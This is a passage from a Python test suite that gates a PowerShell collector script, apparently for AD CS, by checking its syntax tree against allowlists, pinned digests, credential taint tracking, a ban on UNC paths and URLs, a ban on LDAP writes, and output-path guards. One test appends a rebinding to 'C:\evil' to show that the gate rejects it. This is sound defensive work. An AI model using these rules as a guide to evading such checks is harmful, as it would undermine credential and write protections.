    depth = rows[i][0]
    sub = [rows[i]]
    j = i + 1
    while j < len(rows) and rows[j][0] > depth:
        sub.append(rows[j])
        j += 1
    return hashlib.sha256("\n".join(_ast_line(r) for r in sub).encode("utf-8")).hexdigest()


# Children of an ancestor that give a statement its control / declaration
# context (an enclosing if / loop / switch condition, a foreach variable, a
# catch type list, a function's or scriptblock's param block, parameters and
# attributes). Their whole subtrees enter the digest of every statement below.
_CONTEXT_ROLES = frozenset(
    {
        "Clauses.Condition",
        "Condition",
        "Variable",
        "Initializer",
        "Iterator",
        "CatchTypes",
        "ParamBlock",
        "Parameters",
        "Attributes",
        "DynamicParamBlock",
        "Clauses.Pattern",
        "Redirections",
        "CatchClauses",
        "Finally",
    }
)


def _statement_digests(dump: dict[str, Any]) -> dict[str, str]:
    """Digest of EVERY statement (each top-level statement and each statement in
    every function / scriptblock body), keyed by its structural index path.

    Each digest covers the statement's CONTEXT as well as its own subtree: for
    every ancestor from the root down to the statement, the ancestor's own row
    (node type, the role it fills in its parent and every non-child property --
    e.g. NamedBlockAst.BlockKind / Unnamed, FunctionDefinitionAst.Name,
    ForEach / Switch flags), the child index taken, and the full subtrees of the
    ancestor's context children (_CONTEXT_ROLES). So moving a statement,
    re-wrapping it in a begin/process/end/clean block, renaming its function or
    changing an enclosing condition changes its digest, not only an edit to the
    statement itself. A function definition is itself a statement (subsuming
    the former LOCAL_FUNCTION_BODIES)."""
    rows = dump["ast_rows"]
    paths = _row_index_paths(rows)
    n = len(rows)
    lines = [_ast_line(r) for r in rows]
    ends = [0] * n
    for i in range(n - 1, -1, -1):
        j = i + 1
        while j < n and rows[j][0] > rows[i][0]:
            j = ends[j]
        ends[i] = j
    sub_hash: dict[int, str] = {}

    def subtree(i: int) -> str:
        if i not in sub_hash:
            sub_hash[i] = hashlib.sha256("\n".join(lines[i : ends[i]]).encode("utf-8")).hexdigest()
        return sub_hash[i]

    out: dict[str, str] = {}
    stack: list[int] = []  # indices of the ancestors of row i
    for i, row in enumerate(rows):
        depth = row[0]
        while stack and rows[stack[-1]][0] >= depth:
            stack.pop()
        if row[1] == "Statements":
            parts: list[str] = []
            for a in stack:
                parts.append(f"A{paths[a][-1]}|{lines[a].strip()}")
                child_depth = rows[a][0] + 1
                j = a + 1
                while j < ends[a]:
                    if rows[j][0] == child_depth and rows[j][1] in _CONTEXT_ROLES:
                        parts.append(f"C|{rows[j][1]}|{subtree(j)}")
                    j = ends[j] if rows[j][0] >= child_depth else j + 1
            parts.append(f"S{paths[i][-1]}|{subtree(i)}")
            key = ".".join(str(x) for x in paths[i])
            out[key] = hashlib.sha256("\n".join(parts).encode("utf-8")).hexdigest()
        stack.append(i)
    return out


def _statement_digest_labels(dump: dict[str, Any]) -> dict[str, str]:
    """key -> a human hint (the statement's AST type), for the candidate printer."""
    rows = dump["ast_rows"]
    paths = _row_index_paths(rows)
    return {
        ".".join(str(n) for n in paths[i]): row[2]
        for i, row in enumerate(rows)
        if row[1] == "Statements"
    }


def _structure_violations(dump: dict[str, Any]) -> list[str]:
    """Whole-tree screens, local functions, and unpinnable / engine bindings."""
    out: list[str] = []
    if dump["unsupported_nodes"]:
        out.append(f"[ast] nodes the serializer does not cover: {dump['unsupported_nodes']}")
    extra = sorted(set(dump["node_types"]) - ALLOWED_NODE_TYPES)
    if extra:
        out.append(f"[ast] AST node types outside the closed set: {extra}")
    if dump["script_requirements"]:
        out.append("[ast] #Requires is not allowed (it loads modules / changes the engine)")
    if dump["background_pipelines"]:
        out.append(f"[ast] background jobs are not allowed: {dump['background_pipelines']}")
    for sf in dump.get("statement_flags", []):
        if sf["flags"] != "None":
            out.append(
                f"[ast] {sf['scope']}: {sf['kind']} -{sf['flags']} flag is not allowed "
                f"(switch -File / -Regex / foreach -Parallel): {sf['condition']!r}"
            )
    if dump["source_non_ascii_bytes"]:
        out.append(f"[ast] source has {dump['source_non_ascii_bytes']} non-ASCII bytes")

    names = [f["name"] for f in dump["functions"]]
    if len({n.lower() for n in names}) != len(names):
        out.append(f"[local-function] a function is defined twice: {names}")
    if tuple(names) != LOCAL_FUNCTIONS:
        out.append(
            "[local-function] defined functions differ from LOCAL_FUNCTIONS: "
            f"extra {sorted(set(names) - set(LOCAL_FUNCTIONS))}, "
            f"missing {sorted(set(LOCAL_FUNCTIONS) - set(names))}, or reordered"
        )
    for f in dump["function_params"]:
        if f["pipeline_params"]:
            out.append(f"[local-function] {f['name']}: pipeline-bound parameters are not allowed")

    specials: list[tuple[str, Binding]] = []
    for b in dump["bindings"]:
        name, kind = b["variable"], b["kind"]
        if name is None or kind == "common-parameter":
            continue
        where = f"[binding] {b['scope']}: {b.get('target') or name}"
        if b["qualifier"] not in _ALLOWED_QUALIFIERS:
            out.append(
                f"{where}: provider-drive / {b['qualifier']}-scope write ({kind}) is not allowed"
            )
            continue
        if kind == "splat":
            out.append(f"{where}: splatting into a local function is not allowed")
            continue
        if kind == "arg" and (name == "args" or name.startswith("-")):
            out.append(f"{where}: call-site argument {b['value']!r} binds no declared parameter")
            continue
        if name == "null" and kind == "assign Equals":
            continue  # `$null = expr` discards output
        if name in _SPECIAL_VARIABLES or name.endswith("preference"):
            specials.append((name, (kind, b["scope"], b["value"])))
    for name, binding in specials:
        if (name, binding) not in SPECIAL_BINDINGS:
            out.append(
                f"[binding] write to automatic/preference variable ${name} {binding} is not allowed"
            )
    for ref in dump["variable_refs"]:
        if ref["name"] in FORBIDDEN_VARIABLE_REFS:
            out.append(f"[binding] {ref['text']} may not be referenced")
        if ref["qualifier"] == "drive":
            out.append(f"[binding] provider-drive variable {ref['text']} is not allowed")
        if ref["splatted"]:
            out.append(f"[binding] splatted variable {ref['text']} is not allowed")
    return out


def _pinning_violations(dump: dict[str, Any]) -> list[str]:
    out: list[str] = []
    for m in dump["members"]:
        if m["static"] or _cf(m["member"]) not in _ALLOWED_INSTANCE_CF:
            continue
        permitted = _INSTANCE_RECEIVERS_CF.get(_cf(m["member"]), frozenset())
        if (m["receiver_root"] or "") not in permitted:
            out.append(
                f"[receiver] {m['scope']}: {m['text']}: .{m['member']}() on receiver "
                f"{m['receiver_root']!r} (allowed: {sorted(permitted)})"
            )
    required = _required_vars(dump)
    bindings = _bindings_by_var(dump)
    # An explicitly scope-qualified write ($script:/$global:/...) to a confined
    # name, whose resulting key is not the pinned one, deliberately reaches an
    # outer scope to rebind it. (An unqualified same-named local in another
    # function is a genuinely separate variable — _b64's $s vs the searcher $s —
    # and, being per-scope, is pinned/required on its own if it reaches a sink.)
    confined = {k.split("::", 1)[1] for k in PINNED_BINDINGS}
    for b in dump["bindings"]:
        name = b["variable"]
        if (
            name in confined
            and b["qualifier"] in {"script", "global", "local", "private", "variable"}
            and _skey(b["scope"], name) not in PINNED_BINDINGS
        ):
            out.append(
                f"[pinned-binding] {b['scope']}: ${b['qualifier']}:{name} "
                "rebinds a confined variable in an unexpected scope"
            )
    for var in sorted(set(required) - set(PINNED_BINDINGS)):
        out.append(f"[pinned-binding] ${var} must be pinned ({required[var]})")
    for var in sorted(set(PINNED_BINDINGS) - set(required)):
        out.append(
            f"[pinned-binding] stale pin ${var}: no longer a write/exec input, receiver or dependency"
        )
    for var, expected in PINNED_BINDINGS.items():
        got = sorted(bindings.get(var, []))
        if got != sorted(expected):
            extra = sorted((Counter(got) - Counter(expected)).elements())
            missing = sorted((Counter(expected) - Counter(got)).elements())
            out.append(
                f"[pinned-binding] ${var} must be bound exactly as pinned: "
                f"unexpected {extra}, missing {missing}"
            )
    calls = Counter(_member_call_key(m) for m in dump["members"])
    pinned_calls = Counter(PINNED_MEMBER_CALLS)
    for key in sorted((calls - pinned_calls).elements()):
        out.append(f"[member-call] unexpected .NET call {key}")
    for key in sorted((pinned_calls - calls).elements()):
        out.append(f"[member-call] missing .NET call {key}")
    actual = Counter(_guarded_ops(dump))
    allowed = Counter(GUARDED_OPS)
    for op, ctx in sorted((actual - allowed).elements()):
        out.append(f"[guarded-op] unexpected: {op} @ {' > '.join(ctx)}")
    for op, ctx in sorted((allowed - actual).elements()):
        out.append(f"[guarded-op] missing: {op} @ {' > '.join(ctx)}")
    return out


def _secret_closure(dump: dict[str, Any]) -> set[str]:
    """Scoped keys ("<scope>::<name>") of every credential-bearing variable:
    the credential parameters, and every key with a binding (assignment,
    call-site argument, foreach, property write, ...) that reads a secret key
    (resolved per scope, as the binding pins resolve)."""
    bindings = _bindings_by_var(dump)
    secret = {_skey(_SCRIPT, n) for n in SECRET_SEEDS}
    changed = True
    while changed:
        changed = False
        for key, values in bindings.items():
            if key in secret:
                continue
            scope = key.split("::", 1)[0]
            for _kind, value in values:
                if any(
                    _resolve(bindings, ref, scope) & secret and not _only_call_receiver(value, ref)
                    for ref in _vars_in(value)
                ):
                    secret.add(key)
                    changed = True
                    break
    return secret


def _only_call_receiver(value: str, name: str) -> bool:
    """True when every occurrence of $name in *value* is the receiver of a
    method call ($reg.GetDWORDValue(...)): the call's result is data read
    through the credentialed handle, not the credential itself."""
    occurrences = list(
        re.finditer(r"\$(?:[A-Za-z]+:)?\{?" + re.escape(name) + r"\}?(?![A-Za-z0-9_])", value, re.I)
    )
    return bool(occurrences) and all(
        re.match(r"(?:\.[A-Za-z_]\w*)*\.[A-Za-z_]\w*\s*\(", value[m.end() :]) for m in occurrences
    )


def _secret_uses(dump: dict[str, Any], keys: set[str]) -> dict[str, list[tuple[str, str]]]:
    """Every reference to a secret key, as (scope, enclosing statement)."""
    bindings = _bindings_by_var(dump)
    out: dict[str, list[tuple[str, str]]] = {}
    for u in dump.get("variable_uses", []):
        for key in _resolve(bindings, u["name"], u["scope"]) & keys:
            out.setdefault(key, []).append((u["scope"], u["statement"]))
    return out


def _extra_violations(dump: dict[str, Any]) -> list[str]:
    out: list[str] = []
    for t in dump["static_types"]:
        if _NEVER_TYPES.search(t):
            out.append(f"[type] [{t}] is never admitted (LDAP write / non-read transport)")
    # REMOTE_LITERALS: every string literal / expandable string ANYWHERE in the
    # script (a switch -File / foreach input, a here-string, a command or .NET
    # argument, a binding value) that looks like a UNC path, a `//host`
    # authority, a `\\?\` / `\\.\` device path or a `scheme://` URL is
    # refused. The only exemptions are REMOTE_LITERAL_EXEMPTIONS (exact texts),
    # reviewed and committed.
    remote_texts = [(lit["scope"], lit["text"]) for lit in dump.get("string_literals", [])]
    remote_texts += [("<ref>", r["text"]) for r in dump["variable_refs"]]
    remote_texts += [(b["scope"], b.get("target") or "") for b in dump["bindings"]]
    for scope, text in remote_texts:
        if not text or text in REMOTE_LITERAL_EXEMPTIONS:
            continue
        if _UNC_OR_URL.search(text):
            out.append(f"[unc-url] {scope}: {text!r} looks like a UNC path, //host or URL")
    secret = _secret_closure(dump)
    if secret != set(SECRET_VARIABLES):
        out.append(
            f"[secret] credential-bearing variables changed: new {sorted(secret - set(SECRET_VARIABLES))}, "
            f"gone {sorted(set(SECRET_VARIABLES) - secret)}"
        )
    uses = _secret_uses(dump, secret | set(SECRET_VARIABLES))
    for name in sorted(set(uses) | set(SECRET_USES)):
        got = Counter(uses.get(name, []))
        want = Counter(SECRET_USES.get(name, []))
        for scope, stmt in sorted((got - want).elements()):
            out.append(f"[secret] {scope}: ${name} used at an unpinned site: {stmt}")
        for scope, stmt in sorted((want - got).elements()):
            out.append(f"[secret] ${name}: pinned use missing: {scope}: {stmt}")
    if dump.get("header_sha256") != HEADER_SHA256:
        out.append(
            f"[header] the script header / param block changed ({dump.get('header_sha256')}); "
            "edit HEADER_SHA256 deliberately"
        )
    return out


# WRITE GUARD (product defence in depth). The collector resolves every file /
# directory it is about to create with Assert-AdcsOutputPath, which throws
# unless the full path is inside $OutDir (case-insensitive, separator-
# normalized, no UNC / device form, no junction or symlink on the way). Every
# write sink -- each New-Item -Path X and each [IO.File]::WriteAll*(X, ...) --
# must have `guard Assert-AdcsOutputPath X` (the same target text) in its
# control-flow context, i.e. an earlier statement on every path to the sink.
# GUARDED_OPS pins the same contexts exactly; this rule states the intent so a
# re-pin cannot drop a guard silently. The guard's own body is pinned by
# STATEMENT_DIGESTS; rebinding X between guard and sink changes PINNED_BINDINGS.
WRITE_GUARD = "Assert-AdcsOutputPath"


def _write_sinks(dump: dict[str, Any]) -> list[tuple[str, str, str | None, list[str]]]:
    """(scope, text, target or None if unresolvable, context) for every write sink."""
    sinks: list[tuple[str, str, str | None, list[str]]] = []
    for c in dump["commands"]:
        if not c["name"] or _cf(c["name"]) != "new-item":
            continue
        target = None
        elements = c["elements"]
        for i, e in enumerate(elements):
            if e["parameter"] and _cf(e["parameter"]) == "path" and i + 1 < len(elements):
                if elements[i + 1]["parameter"] is None and ":" not in e["text"]:
                    target = elements[i + 1]["text"]
        sinks.append((c["scope"], c["text"], target, list(c["context"])))
    for m in dump["members"]:
        if m["static"] and _cf(m["member"]) in _ALLOWED_WRITE_TARGETS_CF:
            target = m["args"][0] if m["args"] else None
            sinks.append((m["scope"], m["text"], target, list(m.get("context") or [])))
    return sinks


def _write_guard_violations(dump: dict[str, Any]) -> list[str]:
    out = []
    for scope, text, target, context in _write_sinks(dump):
        if target is None:
            out.append(f"[write-guard] {scope}: {text}: write target not resolvable")
            continue
        # Command names are case-insensitive, and so are Windows paths.
        want = _canon(f"guard {WRITE_GUARD} {target}").casefold()
        if not any(_canon(x).casefold() == want for x in context):
            out.append(f"[write-guard] {scope}: {text}: not preceded by {WRITE_GUARD} {target}")
    return out


def violations(dump: dict[str, Any], source: str = "") -> list[str]:
    """Every semantic violation in a parsed script (empty = admitted by the floor).

    Each message starts with the [check] that raised it.
    """
    out = [f"[parse] {e}" for e in dump["parse_errors"]]
    defined = {f["name"].lower() for f in dump["functions"]}
    bound = {b["variable"] for b in dump["bindings"] if b["variable"]}
    for c in dump["commands"]:
        where = f"{c['scope']}: {c['text']}"
        name = c["name"]
        if name is None or not c["bareword"]:
            if not (
                c["operator"] == "Ampersand"
                and (c["scope"], _canon(c["text"]))
                in {(sc, _canon(t)) for sc, t in DYNAMIC_INVOCATIONS}
            ):
                out.append(f"[dynamic] {where}: command name computed at runtime")
            continue
        if c["operator"] == "Dot":
            # Still checked against the allowlists below.
            out.append(f"[dynamic] {where}: dot-sourced invocation runs in the caller's scope")
        if name.lower() in defined:
            if name.lower() == "_writejson":
                vals = [e["text"] for e in c["elements"] if e["parameter"] is None]
                if len(vals) != 2 or not _SAFE_OUTPUT_NAME.fullmatch(vals[1]):
                    out.append(f"[write-path] {where}: _writeJson must take a plain relative name")
            # Named arguments must resolve to a declared parameter (an unresolved
            # one is a [binding] violation); every call-site binding is pinned.
            continue
        check = _ALLOWED_COMMANDS_CF.get(_cf(name))
        if check is None or _cf(name) in _FORBIDDEN_COMMANDS_CF:
            out.append(f"[command] {where}: command {name!r} is not allowlisted")
            continue
        reason = check(c)
        if reason:
            tag = "[write-path]" if _cf(name) == "new-item" else "[command]"
            out.append(f"{tag} {where}: {reason}")
        # Cmdlet metadata resolves prefixes (-Pi) and aliases (-pv/-ov/-ev).
        written = set(c.get("bound_params") or ()) & _VARIABLE_WRITING_PARAMS
        if written:
            out.append(f"[common-parameter] {where}: writes a variable via {sorted(written)}")
    for b in dump["bindings"]:
        if b["kind"] == "common-parameter":
            out.append(f"[common-parameter] {b['scope']}: {b['value']} writes {b['target']!r}")
    for m in dump["members"]:
        where = f"{m['scope']}: {m['text']}"
        if not m["constant_member"]:
            out.append(f"[dynamic] {where}: dynamic member invocation")
            continue
        if m["static"]:
            if (_cf(m["target"]), _cf(m["member"])) not in _ALLOWED_STATIC_CF:
                out.append(f"[member] {where}: static {m['target']}::{m['member']} not allowlisted")
            elif _cf(m["member"]) in _ALLOWED_WRITE_TARGETS_CF and (
                not m["args"]
                or _canon(m["args"][0])
                not in {_canon(t) for t in _ALLOWED_WRITE_TARGETS_CF[_cf(m["member"])]}
            ):
                out.append(f"[write-path] {where}: file write outside the output directory")
            continue
        root = m["receiver_root"]
        if root is not None and root not in bound and root not in _AUTOMATIC_RECEIVERS:
            out.append(f"[receiver] {where}: receiver ${root} has no binding in the script")
        check = _ALLOWED_INSTANCE_CF.get(_cf(m["member"]))
        if check is None:
            out.append(f"[member] {where}: method {m['member']!r} is not allowlisted")
            continue
        reason = check(m)
        if reason:
            out.append(f"[member] {where}: {reason}")
    for r in dump["redirections"]:
        if (r["kind"], r["stream"], r["location"], r["append"]) not in ALLOWED_REDIRECTIONS:
            out.append(f"[redirection] {r['scope']}: {r['text']!r} is not allowed")
    for b in dump["bindings"]:
        if b["kind"].startswith("destructure"):
            out.append(
                f"[binding] {b['scope']}: destructuring assignment {b['target']!r} binds "
                f"${b['variable']}"
            )
        elif b["kind"] == "assign-unrecognised-target":
            out.append(f"[binding] {b['scope']}: unrecognised assignment target {b['target']!r}")
    out.extend(_member_assignment_violations(dump))
    for t in dump["static_types"]:
        if t not in ALLOWED_STATIC_TYPES:
            out.append(f"[type] [{t}] is not allowlisted")
    out.extend(_structure_violations(dump))
    out.extend(_pinning_violations(dump))
    out.extend(_extra_violations(dump))
    out.extend(_write_guard_violations(dump))
    actual = _statement_digests(dump)
    for key in sorted(set(actual) | set(STATEMENT_DIGESTS)):
        if actual.get(key) != STATEMENT_DIGESTS.get(key):
            out.append(
                f"[statement-digest] statement {key} changed (digest "
                f"{actual.get(key)} != pinned {STATEMENT_DIGESTS.get(key)}); "
                "edit STATEMENT_DIGESTS deliberately (print_pin_candidates.py prints it)"
            )
    return out


# --- golden syntax-tree inventory (closed world) -----------------------------------
# tests/collector/collector-inventory.json records (1) ``ast``: an
# order-preserving serialization of the WHOLE syntax tree, one line per node,
# pre-order, indented by depth, naming the property the node fills in its
# parent and every semantically relevant scalar; and (2) ``source_sha256``: a
# digest of the source with only CRLF->LF normalized, so comments and
# whitespace (which the AST omits but a script can observe) are covered too.
# Regenerate (only possible when violations() is empty):
#   .venv/bin/python tests/collector/regen_inventory.py
INVENTORY = ROOT / "tests" / "collector" / "collector-inventory.json"


def _ast_line(row: list[Any]) -> str:
    depth, role, kind, attrs = row[0], row[1], row[2], row[3]
    text = "  " * int(depth) + f"{role}: {kind}"
    for key, value in attrs:
        text += f" {key}={json.dumps(value, ensure_ascii=True)}"
    if len(row) > 4:  # an UNSUPPORTED node also carries its source text
        text += f" text={json.dumps(row[4], ensure_ascii=True)}"
    return text


def inventory(dump: dict[str, Any]) -> dict[str, Any]:
    return {
        "source_sha256": dump["source_sha256"],
        "parse_errors": dump["parse_errors"],
        "ast": [_ast_line(row) for row in dump["ast_rows"]],
    }


def render_inventory(dump: dict[str, Any]) -> str:
    return json.dumps(inventory(dump), indent=1, sort_keys=True, ensure_ascii=True) + "\n"


def golden_ast() -> list[str]:
    ast: list[str] = json.loads(INVENTORY.read_text(encoding="utf-8"))["ast"]
    return ast


def tree_changed(dump: dict[str, Any]) -> bool:
    """True when the edit changed the syntax tree itself (not only the digest)."""
    return inventory(dump)["ast"] != golden_ast()


# --- tests -------------------------------------------------------------------------


def _collector_text() -> str:
    return COLLECTOR.read_bytes().decode("utf-8").replace("\r\n", "\n")


def test_collector_is_read_only() -> None:
    dump = _dump(COLLECTOR)
    found = violations(dump, COLLECTOR.read_text(encoding="utf-8"))
    assert found == [], "collector read-only allowlist violations:\n" + "\n".join(found)
    # Sanity: the dump actually saw the collector's surface.
    names = {c["name"] for c in dump["commands"]}
    assert {"certutil", "Get-WmiObject", "New-Object"} <= names


def test_collector_matches_golden_inventory() -> None:
    """Closed world: the collector's whole syntax tree and source are pinned."""
    current = render_inventory(_dump(COLLECTOR))
    golden = INVENTORY.read_text(encoding="utf-8")
    if current != golden:
        import difflib

        diff = "\n".join(
            list(
                difflib.unified_diff(
                    golden.splitlines(), current.splitlines(), "committed", "current", lineterm=""
                )
            )[:120]
        )
        raise AssertionError(
            "the collector's syntax-tree inventory changed; review the change and, if it is "
            "read-only, regenerate with: .venv/bin/python tests/collector/regen_inventory.py\n"
            + diff
        )


def test_regeneration_refuses_a_failing_collector(tmp_path: Path) -> None:
    bad = tmp_path / "bad.ps1"
    # A second script-scope binding of a pinned write root ($certDir).
    bad.write_text(_collector_text() + "\n$certDir = 'C:\\evil'\n", encoding="utf-8")
    out = tmp_path / "inv.json"
    script = ROOT / "tests" / "collector" / "regen_inventory.py"
    proc = subprocess.run(
        [sys.executable, str(script), "--collector", str(bad), "--out", str(out)],
        capture_output=True,
        text=True,
        timeout=300,
    )
    assert proc.returncode == 1, proc.stderr
    assert "refusing to write" in proc.stderr and "[pinned-binding]" in proc.stderr
    assert not out.exists()


def test_regen_does_not_touch_pin_tables(tmp_path: Path) -> None:
    """The regeneration script writes only the golden JSON; it never edits the
    hand-maintained pin tables, so a helper-body or binding change cannot be
    laundered by a regenerate (it still needs a deliberate edit of this file)."""
    before = Path(__file__).read_bytes()
    out = tmp_path / "inv.json"
    script = ROOT / "tests" / "collector" / "regen_inventory.py"
    proc = subprocess.run(
        [sys.executable, str(script), "--out", str(out)],
        capture_output=True,
        text=True,
        timeout=300,
    )
    assert proc.returncode == 0, proc.stderr
    assert out.exists()
    assert Path(__file__).read_bytes() == before, "regen must not modify the gate/pin file"
    src = script.read_text(encoding="utf-8")
    for table in (
        "PINNED_BINDINGS",
        "GUARDED_OPS",
        "STATEMENT_DIGESTS",
        "INSTANCE_RECEIVERS",
        "PINNED_MEMBER_CALLS",
        "NEW_OBJECT_VECTORS",
        "SECRET_VARIABLES",
        "SECRET_USES",
        "HEADER_SHA256",
        "DYNAMIC_INVOCATIONS",
        "print_pin_candidates",
    ):
        assert table not in src, f"regen_inventory.py must not reference {table}"


def test_pin_candidate_printer_writes_nothing(tmp_path: Path) -> None:
    """The rebuild helper only prints; the gate file is untouched."""
    before = Path(__file__).read_bytes()
    script = ROOT / "tests" / "collector" / "print_pin_candidates.py"
    proc = subprocess.run(
        [sys.executable, str(script)], capture_output=True, text=True, timeout=300, cwd=tmp_path
    )
    assert proc.returncode == 0, proc.stderr
    assert "PINNED_BINDINGS" in proc.stdout and "PINNED_MEMBER_CALLS" in proc.stdout
    assert Path(__file__).read_bytes() == before
    assert list(tmp_path.iterdir()) == []


# One statement nested under every kind of ancestor context; each mutation
# changes ONE ancestor property and must change that statement's digest.
_ANCESTOR_BASE = """function Get-Probe {
  [CmdletBinding()]
  param([string]$p)
  if ($p -eq 'x') {
    foreach ($i in @(1)) {
      try {
        switch ($i) { 1 { Write-Output 'probe-inner' } }
      } catch [System.Exception] { }
    }
  }
}
"""
_ANCESTOR_MUTATIONS = {
    "block-kind": ("  if ($p -eq 'x') {", "  process {\n  if ($p -eq 'x') {", "BLOCK"),
    "function-name": ("function Get-Probe {", "function Get-Other {", ""),
    "parameter": ("param([string]$p)", "param([int]$p)", ""),
    "attribute": ("  [CmdletBinding()]\n", "", ""),
    "if-condition": ("if ($p -eq 'x')", "if ($p -ne 'x')", ""),
    "foreach-variable": ("foreach ($i in @(1))", "foreach ($j in @(1))", ""),
    "foreach-source": ("foreach ($i in @(1))", "foreach ($i in @(2))", ""),
    "catch-type": ("catch [System.Exception]", "catch [System.IO.IOException]", ""),
    "switch-condition": ("switch ($i)", "switch ($i + 1)", ""),
    "switch-flag": ("switch ($i)", "switch -Regex ($i)", ""),
    "switch-pattern": ("{ 1 { Write", "{ 2 { Write", ""),
    "scriptblock-nesting": (
        "{ 1 { Write-Output 'probe-inner' } }",
        "{ 1 { & { Write-Output 'probe-inner' } } }",
        "",
    ),
}


def _probe_statement_digest(dump: dict[str, Any]) -> str:
    """The digest of the innermost `Write-Output 'probe-inner'` statement."""
    rows = dump["ast_rows"]
    paths = _row_index_paths(rows)
    digests = _statement_digests(dump)
    best: tuple[int, str] | None = None
    for i, row in enumerate(rows):
        if row[1] != "Statements":
            continue
        j = i + 1
        while j < len(rows) and rows[j][0] > row[0]:
            j += 1
        sub = rows[i:j]
        if any(
            r[2] == "StringConstantExpressionAst"
            and ["Value", "probe-inner"] in [list(a) for a in r[3]]
            for r in sub
        ):
            if best is None or len(sub) < best[0]:
                best = (len(sub), ".".join(str(x) for x in paths[i]))
    assert best is not None
    return digests[best[1]]


def test_statement_digest_covers_every_ancestor_property(tmp_path: Path) -> None:
    """Each ancestor-context property (block kind / unnamed, function name,
    parameters, attributes, if condition, foreach variable and source, catch
    types, switch condition / flag / pattern, scriptblock nesting) changes the
    digest of a statement nested beneath it."""
    files = [tmp_path / "base.ps1"]
    files[0].write_text(_ANCESTOR_BASE, encoding="utf-8")
    for name, (old, new, tail) in _ANCESTOR_MUTATIONS.items():
        assert _ANCESTOR_BASE.count(old) == 1, name
        f = tmp_path / f"{name}.ps1"
        text = _ANCESTOR_BASE.replace(old, new, 1)
        if tail == "BLOCK":  # close the new process block before the function's brace
            text = text[: text.rindex("}")] + "}\n}\n"
        f.write_text(text, encoding="utf-8")
        files.append(f)
    dumps = _run_dumper(files, "-Many")
    assert all(not d["parse_errors"] for d in dumps), [d["parse_errors"] for d in dumps]
    base = _probe_statement_digest(dumps[0])
    unchanged = [
        name
        for name, d in zip(_ANCESTOR_MUTATIONS, dumps[1:], strict=True)
        if _probe_statement_digest(d) == base
    ]
    assert not unchanged, (
        f"ancestor mutations that left the statement digest unchanged: {unchanged}"
    )


def test_statement_digests_cover_every_statement() -> None:
    """Every statement has a pinned digest and vice versa, and all match; every
    top-level function definition is among them (subsuming the old body pins)."""
    dump = _dump(COLLECTOR)
    digests = _statement_digests(dump)
    assert digests == STATEMENT_DIGESTS
    labels = _statement_digest_labels(dump)
    # Every local function appears as a (top-level) function-definition statement,
    # so STATEMENT_DIGESTS subsumes the former per-function body pins.
    assert sum(t == "FunctionDefinitionAst" for t in labels.values()) == len(LOCAL_FUNCTIONS)


def test_pins_cover_exactly_the_required_variables() -> None:
    """Every required variable is pinned, and every pin is still required."""
    dump = _dump(COLLECTOR)
    assert set(PINNED_BINDINGS) == set(_required_vars(dump))
    # The write paths and the remote-host / credential provenance are among them
    # (keyed by scope; the counters $i/$j live in the <script> scope).
    names = {k.split("::", 1)[1] for k in PINNED_BINDINGS}
    assert {
        "outdir",
        "outname",
        "outpath",
        "outparent",
        "certdir",
        "certfile",
        "crlfile",
        "i",
        "j",
        "dcdns",
        "dccred",
        "reg",
        "regpath",
    } <= names


def test_allowlist_has_no_stale_entries() -> None:
    """Every allowlist / closed-set entry is still used — keep the lists honest."""
    dump = _dump(COLLECTOR)
    used_cmds = {c["name"] for c in dump["commands"]}
    used_members = {m["member"] for m in dump["members"] if not m["static"]}
    used_static = {(m["target"], m["member"]) for m in dump["members"] if m["static"]}
    assert set(ALLOWED_COMMANDS) - used_cmds == set()
    assert set(ALLOWED_INSTANCE) - used_members == set()
    assert ALLOWED_STATIC - used_static == set()
    assert set(dump["node_types"]) == ALLOWED_NODE_TYPES
    receivers: dict[str, set[str]] = {}
    for m in dump["members"]:
        if not m["static"]:
            receivers.setdefault(m["member"], set()).add(m["receiver_root"] or "")
    assert receivers == {k: set(v) for k, v in INSTANCE_RECEIVERS.items()}
    assert set(INSTANCE_RECEIVERS) == set(ALLOWED_INSTANCE)
    assert Counter(_guarded_ops(dump)) == Counter(GUARDED_OPS)
    # Every command invocation is pinned (not just the side-effecting ones).
    commands = Counter((c["text"], tuple(c["context"])) for c in dump["commands"])
    assert not commands - Counter(GUARDED_OPS)
    assert set(dump["static_types"]) == ALLOWED_STATIC_TYPES
    used_vectors = {
        tuple(_canon(a) for a in c["args"])
        for c in dump["commands"]
        if _cf(c["name"]) == "new-object"
    }
    assert used_vectors == set(_NEW_OBJECT_VECTORS_CANON)
    dynamic = {
        (c["scope"], c["text"]) for c in dump["commands"] if not c["name"] or not c["bareword"]
    }
    assert dynamic == set(DYNAMIC_INVOCATIONS)
    redirections = {
        (r["kind"], r["stream"], r["location"], r["append"]) for r in dump["redirections"]
    }
    assert redirections == ALLOWED_REDIRECTIONS
    specials = {
        (b["variable"], (b["kind"], b["scope"], b["value"]))
        for b in dump["bindings"]
        if b["variable"]
        and (b["variable"] in _SPECIAL_VARIABLES or b["variable"].endswith("preference"))
        and not (b["variable"] == "null" and b["kind"] == "assign Equals")  # discards
    }
    assert specials == set(SPECIAL_BINDINGS)


def test_never_types_are_never_allowlisted() -> None:
    """LDAP write requests (Modify/Add/Delete/ModifyDN/Extended) and other
    non-read transports are in no allowlist, so no collector change can admit
    them by regenerating."""
    names = set(ALLOWED_STATIC_TYPES) | {t.strip("[]") for t, _m in ALLOWED_STATIC}
    names |= {v[0] for v in NEW_OBJECT_VECTORS}
    assert not {n for n in names if _NEVER_TYPES.search(n)}
    for t in ("ModifyRequest", "AddRequest", "DeleteRequest", "ModifyDNRequest", "ExtendedRequest"):
        assert _NEVER_TYPES.search(f"System.DirectoryServices.Protocols.{t}")


def test_every_argument_and_condition_variable_is_pinned() -> None:
    """Closure coverage: every variable in every command argument, every .NET
    call's receiver and arguments, and every branch/loop condition resolves to a
    pinned binding key (or is an engine variable that may be read unpinned)."""
    dump = _dump(COLLECTOR)
    bindings = _bindings_by_var(dump)
    uses: list[tuple[str, str]] = []
    for c in dump["commands"]:
        for text in [c.get("head", ""), *(e["text"] for e in c["elements"])]:
            uses += [(v, c["scope"]) for v in _vars_in(text)]
    for m in dump["members"]:
        for text in [m["target"], *m["args"]]:
            uses += [(v, m["scope"]) for v in _vars_in(text)]
    for cond in dump["conditions"]:
        uses += [(v, cond["scope"]) for v in _vars_in(cond["text"])]
    missing = sorted(
        {
            (v, scope)
            for v, scope in uses
            if v not in _AUTO_READ_OK
            and v not in {"lastexitcode", "pscmdlet", "this"}
            and not (_resolve(bindings, v, scope) & set(PINNED_BINDINGS))
            and _resolve(bindings, v, scope)
        }
    )
    assert not missing, missing


def test_secret_taint_is_closed_and_pinned() -> None:
    dump = _dump(COLLECTOR)
